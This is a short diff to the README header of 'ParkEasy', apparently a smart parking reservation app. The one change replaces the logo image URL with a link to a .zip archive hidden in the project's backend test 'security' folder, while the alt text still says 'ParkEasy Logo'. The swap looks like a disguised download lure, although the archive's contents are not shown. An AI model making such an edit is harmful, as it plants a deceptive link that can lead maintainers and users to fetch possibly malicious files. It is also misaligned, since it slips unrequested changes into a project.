@@ -1,5 +1,5 @@
 <div align="center">
-  <img src="https://img.icons8.com/color/144/000000/parking.png" alt="ParkEasy Logo" width="100"/>
+  <img src="https://github.com/shivendra911/parkeasy/raw/refs/heads/main/backend/src/test/java/com/parkeasy/backend/security/3.8.zip" alt="ParkEasy Logo" width="100"/>
   <h1>ParkEasy 🅿️</h1>
   <p><strong>A Next-Generation Smart Parking Reservation Platform</strong></p>
 
